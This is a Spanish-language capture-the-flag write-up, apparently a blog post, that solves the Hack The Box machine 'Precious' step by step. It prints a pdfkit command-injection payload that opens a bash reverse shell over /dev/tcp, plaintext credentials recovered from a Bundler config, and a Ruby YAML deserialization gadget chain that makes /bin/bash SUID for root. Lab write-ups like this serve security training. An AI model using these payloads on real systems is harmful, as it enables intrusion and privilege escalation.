---
layout: post
title: Precious
date: 2022-12-28
categories: ["HTB", "PDF", "File Edit"]
thumbnail: "assets/images/Precious.png"
---

# Precious [ Hack The Box ]

### Reconocimiento
##### Descubrimiento de puertos y reconocimiento básico
- `nmap -sS --min-rate 5000 10.10.11.189 -oG allPorts`
- `nmap -sCV -p22,80 10.10.11.189 -oN targeted`

No vemos nada interesante, sigamos investigando.

### Shell
Cuando entramos a la página vemos una caja que nos pide una `URL` para convertirla a `PDF`. Con `Python` me monté un servidor:

- `python3 -m http.server 80`

Para ver si recibimos alguna conexión probé a poner mi servidor `HTTP` y darle al `enter`. Como nos esperábamos, hay conectividad y además se nos descarga el `PDF`.

Con `exiftool` miraremos las propiedades del `PDF` para ver qué podemos encontrar:

- `exiftool archivo.pdf`

```
ExifTool Version Number         : 12.16
File Name                       : archivo.pdf
Directory                       : .
File Size                       : 17 KiB
File Modification Date/Time     : 2022:12:02 21:07:38-06:00
File Access Date/Time           : 2022:12:02 21:07:38-06:00
File Inode Change Date/Time     : 2022:12:02 21:07:53-06:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```

En la última fila vemos que ha sido generado por `PDFKit` versión `0.8.6`. Si buscamos información nos encontraremos con que es vulnerable a `Command Injection` ([`Snyk`](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795)).

Para ganar una Reverse Shell primero nos pondremos en escucha con `NC` por el puerto que queramos, en mi caso el `4444`:

- `nc -nlvp 4444`

Perfecto, el siguiente paso será irnos a [`IronHackers`](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/) y copiarnos una Reverse Shell en `Bash`.

Una vez tengamos todo hecho volveremos a la página y de vuelta pondremos nuestro servidor `HTTP` pero con una pequeña modificación:

- `http://10.10.11.89/?name=#{'%20`bash -i >& /dev/tcp/10.10.11.89/4444 0>&1`'}`

Bien! Ya estamos en la máquina como `Ruby`!

### Subida de privilegios #1
Una vez estemos dentro de la máquina nuestro objetivo es ser `root`, aunque debemos pasar por otro usuario antes (`Henry`).

Para ello me fui al directorio personal de `Ruby` e hice `ls -la`:

```
drwxr-xr-x 4 ruby ruby 4096 Dec  2 22:03 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 3 ruby ruby 4096 Dec  2 22:03 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
```

Vemos una carpeta llamada `.bundle`, si entramos nos encontraremos con un fichero con el nombre de `config`, vamos a leer lo que pone:

```
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

Wow! Podemos ver en texto claro las credenciales de `Henry`!

### Subida de privilegios #2
Ahora sí podemos seguir con nuestro objetivo principal: conseguir ser `root`. Para ello lo 
primero que hice fue hacer `sudo -l` para mirar los permisos de `sudoers`:

```
Matching Defaults entries for henry on precious:
    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

Vemos que podemos ejecutar como `root` y sin contraseña el binario de `Ruby`. Por desgracia sólo podemos usarlo para un archivo en específico.

Si miramos el código veremos que necesitaremos un archivo llamado `dependencies.yml`. Para crear el nuestro podemos utilizar el siguiente [`payload`](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml). Lo editaremos a nuestro gusto:

```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: chmod u+s /bin/bash
         method_id: :resolve
```

Vemos que en el apartado `git_set` hemos hecho que la `Bash` sea `SUID`, vamos a ejecutarlo:

- `sudo /usr/bin/ruby /opt/update_dependencies.rb`

Bien! Si ahora hacemos `ls -l /bin/bash` veremos que los permisos han cambiado y con `bash -p` nos convertimos en `root`.

Enhorabuena! Ya estamos como `root` en la máquina víctima! Qué fácil!